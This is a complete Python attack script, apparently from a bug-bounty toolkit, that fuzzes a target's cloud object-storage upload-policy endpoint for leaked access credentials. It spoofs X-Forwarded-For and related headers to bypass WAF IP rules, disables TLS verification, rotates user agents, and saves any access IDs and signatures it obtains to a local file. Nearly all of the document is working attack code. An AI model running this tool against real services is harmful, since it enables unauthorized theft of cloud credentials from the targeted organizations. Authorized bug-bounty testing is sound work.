import requests
import json
import urllib3
import time
import argparse
import sys
import random
from colorama import Fore, Style, init

# Inicialização
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Listas Padrão (Fallback se não passar wordlist)
DEFAULT_KEYS = [
    "type", "fileType", "category", "bizType", "scene", "module", "usage",
    "bucket", "dir", "prefix", "business", "uploadType", "kind", "scope"
]

DEFAULT_VALUES = [
    "common", "image", "file", "excel", "video", "media",
    "avatar", "feedback", "report", "template", "invoice", "contract",
    "crm", "chat", "shop", "user", "admin", "system", "config",
    "temp", "public", "private", "upload", "default",
    "1", "0", "true", "false", "null"
]

def get_args():
    parser = argparse.ArgumentParser(description="Generic OSS Policy Fuzzer - Caçador de Credenciais de Cloud")
    
    parser.add_argument("-u", "--url", required=True, help="URL do endpoint (ex: https://alvo.com/rest/oss/policy)")
    parser.add_argument("-i", "--ip", help="IP para Bypass de WAF (X-Forwarded-For)")
    parser.add_argument("-c", "--cookie", help="String de Cookie (se precisar de sessão)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Tempo de espera entre requisições em segundos (Default: 1.0)")
    parser.add_argument("-p", "--proxy", help="URL do Proxy (ex: http://127.0.0.1:8080)")
    parser.add_argument("--random-agent", action="store_true", help="Usa User-Agent aleatório")
    
    # Wordlists personalizadas
    parser.add_argument("--keys", help="Arquivo com lista de chaves (parâmetros) para testar")
    parser.add_argument("--values", help="Arquivo com lista de valores para testar")
    
    return parser.parse_args()

def load_list(filepath, default_list):
    if not filepath:
        return default_list
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Arquivo {filepath} não encontrado. Usando lista padrão.")
        return default_list

def main():
    args = get_args()
    
    # Configuração de Proxy
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    
    # Headers Base
    headers = {
        "Content-Type": "application/json",
        "Referer": args.url, # Muitas vezes o Referer deve ser o próprio domínio
        "User-Agent": "Mozilla/5.0 (BugBountyToolkit/OSS-Fuzzer)"
    }
    
    if args.ip:
        headers["X-Forwarded-For"] = args.ip
        headers["X-Real-IP"] = args.ip
        headers["X-Originating-IP"] = args.ip
        print(f"{Fore.CYAN}[*] Bypass IP Ativado: {args.ip}")

    if args.cookie:
        headers["Cookie"] = args.cookie

    # Carrega Wordlists
    keys = load_list(args.keys, DEFAULT_KEYS)
    values = load_list(args.values, DEFAULT_VALUES)
    
    print(f"{Fore.CYAN}[*] Iniciando Fuzzing em: {Style.BRIGHT}{args.url}")
    print(f"{Fore.CYAN}[*] Combinações totais: {len(keys) * len(values)}")
    print(f"{Fore.CYAN}[*] Delay: {args.delay}s")
    
    # 1. Baseline - Descobrir qual é o erro padrão
    print(f"\n{Fore.YELLOW}[*] Calibrando erro padrão...")
    baseline_error = ""
    try:
        r = requests.post(args.url, headers=headers, json={"fileName":"baseline.xlsx"}, verify=False, proxies=proxies, timeout=5)
        baseline_error = r.text
        print(f"{Fore.LIGHTBLACK_EX}    Resposta Padrão (Lixo): {baseline_error[:80]}...")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro de conexão na calibração: {e}")
        sys.exit(1)

    print(f"{Fore.GREEN}[+] Calibração concluída. Iniciando ataque...\n")

    # 2. Ataque
    try:
        for key in keys:
            for val in values:
                # Monta payload
                payload = {
                    "fileName": f"report_{int(time.time())}.xlsx", # Nome dinâmico
                    key: val
                }

                try:
                    r = requests.post(args.url, headers=headers, json=payload, verify=False, proxies=proxies, timeout=5)
                    
                    # Checagem de Sucesso (Leak de Credenciais)
                    response_lower = r.text.lower()
                    if "accessid" in response_lower or "signature" in response_lower or "policy" in response_lower:
                        print(f"\n\n{Fore.GREEN}==========================================")
                        print(f"{Fore.GREEN}[!!!] SUCESSO - CREDENCIAIS ENCONTRADAS [!!!]")
                        print(f"{Fore.GREEN}==========================================")
                        print(f"{Fore.YELLOW}Payload Mágico: {json.dumps(payload)}")
                        print(f"{Fore.WHITE}Resposta: {r.text}")
                        
                        # Salva em arquivo
                        with open("oss_leak.txt", "w") as f:
                            f.write(f"URL: {args.url}\nPayload: {json.dumps(payload)}\nResponse: {r.text}\n")
                        print(f"\n{Fore.CYAN}[*] Salvo em oss_leak.txt")
                        sys.exit(0) # Para tudo, já achamos

                    # Checagem de Anomalia (Se o erro mudou)
                    # Comparamos se a resposta atual é DIFERENTE da resposta padrão de erro
                    if r.text != baseline_error and r.status_code == 200:
                         # Filtra ruído pequeno (ex: timestamp mudando)
                         if len(r.text) != len(baseline_error): 
                            print(f"\n{Fore.BLUE}[?] Comportamento Diferente Detectado!")
                            print(f"    Payload: {key}={val}")
                            print(f"    Msg: {r.text[:100]}...")

                except Exception as e:
                    print(f"\n{Fore.RED}[!] Erro na requisição: {e}")

                # Feedback visual na mesma linha e Delay
                print(f"\r{Fore.LIGHTBLACK_EX}Testando: {key}={val} ...", end="")
                time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrompido pelo usuário.")

    print(f"\n{Fore.CYAN}[*] Fuzzing finalizado.")

if __name__ == "__main__":
    main()
